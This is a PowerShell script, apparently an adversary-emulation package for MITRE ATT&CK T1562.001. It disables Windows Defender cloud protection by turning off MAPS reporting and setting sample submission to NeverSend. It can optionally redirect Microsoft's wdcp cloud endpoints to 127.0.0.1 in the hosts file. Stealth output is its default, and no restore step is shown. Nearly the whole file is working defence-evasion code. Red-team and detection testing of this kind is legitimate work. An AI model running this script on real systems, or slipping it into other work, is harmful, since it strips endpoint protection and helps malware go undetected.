# T1562.001B - MITRE ATT&CK Impair Defenses: Disable Windows Defender Cloud Protection
# Tactic: TA0005 Defense Evasion - Specific Cloud/MAPS Protection disable only
# Package Type: inject - Active system modification (single atomic action)
# Script Length: ~110 lines (atomic focus)
# Functions: 5 infrastructure + 4 triple output + 1 technique function

#Requires -Version 3.0
#Requires -RunAsAdministrator


function Get-EnvironmentVariables {
    $config = @{
        # Variables de base
        OUTPUT_BASE = if ($env:T1562_001_OUTPUT_BASE) { $env:T1562_001_OUTPUT_BASE } else { "C:\temp\mitre_results" }
        DEBUG_MODE = if ($env:T1562_001_DEBUG_MODE) { $env:T1562_001_DEBUG_MODE -eq "true" } else { $false }
        STEALTH_MODE = if ($env:T1562_001_STEALTH_MODE) { $env:T1562_001_STEALTH_MODE -eq "true" } else { $true }
        SAFE_MODE = if ($env:T1562_001_SAFE_MODE) { $env:T1562_001_SAFE_MODE -eq "true" } else { $false }
        
        # Variables sp cifiques Cloud Protection
        DISABLE_MAPS = if ($env:T1562_001_DISABLE_MAPS) { $env:T1562_001_DISABLE_MAPS -eq "true" } else { $true }
        DISABLE_SAMPLE_SUBMISSION = if ($env:T1562_001_DISABLE_SAMPLE_SUBMISSION) { $env:T1562_001_DISABLE_SAMPLE_SUBMISSION -eq "true" } else { $true }
        BLOCK_ENDPOINTS = if ($env:T1562_001_BLOCK_ENDPOINTS) { $env:T1562_001_BLOCK_ENDPOINTS -eq "true" } else { $false }
        CLOUD_ENDPOINTS = if ($env:T1562_001_CLOUD_ENDPOINTS) { $env:T1562_001_CLOUD_ENDPOINTS } else { "wdcp.microsoft.com,wdcpalt.microsoft.com" }
    }
    
    return $config
}

function Initialize-OutputStructure {
    param([string]$OutputBase, [string]$TechniqueId)
    
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $outputDir = Join-Path $OutputBase "${TechniqueId}_${timestamp}"
    
    if (-not (Test-Path $outputDir)) {
        New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
    }
    
    return $outputDir
}

function Write-JsonOutput {
    param([hashtable]$Data, [string]$OutputPath, [hashtable]$Metadata)
    
    $jsonOutput = @{
        technique_id = $Metadata.technique_id
        timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ"
        results = $Data
        system_context = @{
            hostname = $env:COMPUTERNAME
            username = $env:USERNAME
        }
    }
    
    $jsonOutput | ConvertTo-Json -Depth 5 | Out-File -FilePath $OutputPath -Encoding UTF8
}

function Get-ExecutionMetadata {
    param([string]$TechniqueId, [string]$Action)
    
    return @{
        technique_id = $TechniqueId
        action = $Action
        timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ"
        hostname = $env:COMPUTERNAME
    }
}

function Invoke-SafeCommand {
    param([string]$Command, [hashtable]$Config, [string]$Description = "")
    
    if ($Config.SAFE_MODE) {
        if (-not $Config.STEALTH_MODE) {
            Write-Host "[SAFE MODE - REAL EXECUTION] Executing: $Description" -ForegroundColor Yellow
        }
    }
    
    try {
        $result = Invoke-Expression $Command 2>&1
        return @{ success = $true; output = $result }
    }
    catch {
        return @{ success = $false; output = $_.Exception.Message }
    }
}


function Write-SimpleOutput {
    param([hashtable]$Results, [hashtable]$Config)
    
    if ($Config.STEALTH_MODE) { return }
    
    Write-Host "T1562.001B CLOUD PROTECTION DISABLE " -ForegroundColor Red
    $mapsStatus = if ($Results.maps_disabled) { "DISABLED" } else { "FAILED" }
    $sampleStatus = if ($Results.sample_submission_disabled) { "DISABLED" } else { "FAILED" }
    
    Write-Host "MAPS Reporting: $mapsStatus" -ForegroundColor $(if ($Results.maps_disabled) { "Green" } else { "Red" })
    Write-Host "Sample Submission: $sampleStatus" -ForegroundColor $(if ($Results.sample_submission_disabled) { "Green" } else { "Red" })
}

function Write-DebugOutput {
    param([hashtable]$Results, [string]$OutputPath, [hashtable]$Metadata, [hashtable]$Config)
    
    if ($Config.DEBUG_MODE) {
        $debugFile = Join-Path (Split-Path $OutputPath) "debug_cloud.json"
        Write-JsonOutput -Data $Results -OutputPath $debugFile -Metadata $Metadata
    }
}

function Write-StealthOutput {
    param([hashtable]$Results, [string]$OutputPath, [hashtable]$Config)
    
    if ($Config.STEALTH_MODE) {
        $stealthFile = Join-Path (Split-Path $OutputPath) "cloud.log"
        "T1562.001B executed at $(Get-Date)" | Out-File -FilePath $stealthFile -Append
    }
}

function Select-OutputMode {
    param([hashtable]$Results, [string]$OutputPath, [hashtable]$Metadata, [hashtable]$Config)
    
    Write-SimpleOutput -Results $Results -Config $Config
    Write-DebugOutput -Results $Results -OutputPath $OutputPath -Metadata $Metadata -Config $Config
    Write-StealthOutput -Results $Results -OutputPath $OutputPath -Config $Config
}


# TECHNIQUE-SPECIFIC FUNCTION (ATOMIC ACTION)


function Disable-CloudProtection {
    param([hashtable]$Config)
    
    $results = @{
        maps_disabled = $false
        sample_submission_disabled = $false
        endpoints_blocked = $false
        errors = @()
    }
    
    # 1. Disable MAPS Reporting (Microsoft Active Protection Service)
    if ($Config.DISABLE_MAPS) {
        $mapsCmd = 'Set-MpPreference -MAPSReporting Disabled'
        $result = Invoke-SafeCommand -Command $mapsCmd -Config $Config -Description "Disabling MAPS Reporting"
        $results.maps_disabled = $result.success
        
        if (-not $result.success) {
            $results.errors += "MAPS disable failed: $($result.output)"
        }
    }
    
    # 2. Disable Automatic Sample Submission
    if ($Config.DISABLE_SAMPLE_SUBMISSION) {
        $sampleCmd = 'Set-MpPreference -SubmitSamplesConsent NeverSend'
        $result = Invoke-SafeCommand -Command $sampleCmd -Config $Config -Description "Disabling Sample Submission"
        $results.sample_submission_disabled = $result.success
        
        if (-not $result.success) {
            $results.errors += "Sample submission disable failed: $($result.output)"
        }
    }
    
    # 3. Block Cloud Endpoints (Optional - via hosts file or firewall)
    if ($Config.BLOCK_ENDPOINTS) {
        $endpoints = $Config.CLOUD_ENDPOINTS -split ','
        foreach ($endpoint in $endpoints) {
            $hostsCmd = "Add-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Value '127.0.0.1 $($endpoint.Trim())'"
            $result = Invoke-SafeCommand -Command $hostsCmd -Config $Config -Description "Blocking endpoint: $($endpoint.Trim())"
            
            if ($result.success) {
                $results.endpoints_blocked = $true
            }
        }
    }
    
    return $results
}


# MAIN EXECUTION


try {
    $config = Get-EnvironmentVariables
    $metadata = Get-ExecutionMetadata -TechniqueId "T1562.001b" -Action "disable_cloud_protection"
    $outputDir = Initialize-OutputStructure -OutputBase $Config.OUTPUT_BASE -TechniqueId $metadata.technique_id
    
    $results = Disable-CloudProtection -Config $config
    
    $outputFile = Join-Path $outputDir "cloud_protection_results.json"
    Select-OutputMode -Results $results -OutputPath $outputFile -Metadata $metadata -Config $config
    
} catch {
    if (-not $Config.STEALTH_MODE) {
        Write-Host "[ERROR] $($_.Exception.Message)" -ForegroundColor Red
    }
    exit 1
}


